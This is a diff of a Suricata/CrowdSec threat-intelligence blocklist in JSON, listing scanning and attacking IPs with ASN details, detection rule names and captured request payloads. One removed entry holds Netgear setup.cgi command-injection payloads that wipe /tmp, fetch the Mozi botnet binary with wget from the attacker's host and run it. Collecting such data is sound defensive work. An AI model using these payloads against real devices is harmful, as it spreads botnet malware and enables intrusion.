@@ -1,104 +1,13 @@
 {
-  "generated_at": "2026-11-18T13:00:00Z",
+  "generated_at": "2026-11-19T01:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 67,
-    "v4": 67,
+    "total": 66,
+    "v4": 66,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "139.135.60.219",
-      "family": "v4",
-      "first_seen": "2026-11-11T21:00:00Z",
-      "last_seen": "2026-11-11T21:00:00Z",
-      "scenarios": [
-        "crowdsec/http-cve-probing",
-        "crowdsec/netgear_rce",
-        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
-      ],
-      "sources": [
-        "crowdsec",
-        "suricata"
-      ],
-      "asn": "9541",
-      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
-      "asn_prefix": "139.135.60.0/24",
-      "payloads": [
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://139.135.60.219:40631/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://139.135.60.219:40631/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
-    {
-      "ip": "85.217.140.0",
-      "family": "v4",
-      "first_seen": "2026-11-11T22:00:00Z",
-      "last_seen": "2026-11-11T22:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN Suspicious User-Agent Containing Web Scan/er Likely Web Scanner"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "209334",
-      "asn_name": "MODAT-01 Modat B.V.",
-      "asn_prefix": "85.217.140.0/24",
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "139.135.59.202",
-      "family": "v4",
-      "first_seen": "2026-11-11T21:00:00Z",
-      "last_seen": "2026-11-11T21:00:00Z",
-      "scenarios": [
-        "suricata/ET EXPLOIT HackingTrio UA (Hello, World)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "9541",
-      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
-      "asn_prefix": "139.135.59.0/24",
-      "payloads": [
-        "POST /GponForm/diag_Form?images/"
-      ]
-    },
-    {
-      "ip": "87.97.172.55",
-      "family": "v4",
-      "first_seen": "2026-11-11T21:00:00Z",
-      "last_seen": "2026-11-11T21:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA HTTP unable to match response to request"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "13124",
-      "asn_name": "A1BG_RSD A1 Bulgaria EAD",
-      "asn_prefix": "87.97.172.0/24"
-    },
-    {
-      "ip": "175.195.238.137",
-      "family": "v4",
-      "first_seen": "2026-11-11T23:00:00Z",
-      "last_seen": "2026-11-11T23:00:00Z",
-      "scenarios": [
-        "suricata/ET WEB_SERVER WebShell Generic - wget http - POST"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "4766",
-      "asn_name": "KIXS-AS-KR-KR - Korea Telecom",
-      "asn_prefix": "175.192.0.0/13",
-      "payloads": [
-        "POST /cgi-bin/ViewLog.asp"
-      ]
-    },
     {
       "ip": "52.180.139.148",
       "family": "v4",
@@ -1222,7 +1131,10 @@
       ],
       "sources": [
         "suricata"
-      ]
+      ],
+      "asn": "55430",
+      "asn_name": "STARHUB-NGNBN - Starhub Ltd",
+      "asn_prefix": "58.182.0.0/18"
     },
     {
       "ip": "212.104.214.7",
@@ -1238,6 +1150,77 @@
       "asn": "212238",
       "asn_name": "CDNEXT Datacamp Limited",
       "asn_prefix": "212.104.214.0/24"
+    },
+    {
+      "ip": "20.65.178.231",
+      "family": "v4",
+      "first_seen": "2026-11-18T21:00:00Z",
+      "last_seen": "2026-11-18T21:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA SSH invalid banner"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.64.0.0/10",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ]
+    },
+    {
+      "ip": "161.97.99.129",
+      "family": "v4",
+      "first_seen": "2026-11-18T15:00:00Z",
+      "last_seen": "2026-11-18T15:00:00Z",
+      "scenarios": [
+        "suricata/ET WEB_SERVER WEB-PHP phpinfo access"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "51167",
+      "asn_name": "CONTABO Contabo GmbH",
+      "asn_prefix": "161.97.98.0/23",
+      "payloads": [
+        "GET /dev/lara/phpinfo.php"
+      ]
+    },
+    {
+      "ip": "77.239.124.252",
+      "family": "v4",
+      "first_seen": "2026-11-18T13:00:00Z",
+      "last_seen": "2026-11-18T13:00:00Z",
+      "scenarios": [
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 19"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "198364",
+      "asn_prefix": "77.239.124.0/24"
+    },
+    {
+      "ip": "20.118.227.163",
+      "family": "v4",
+      "first_seen": "2026-11-19T00:00:00Z",
+      "last_seen": "2026-11-19T00:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.64.0.0/10",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /manager/html"
+      ]
     }
   ]
 }
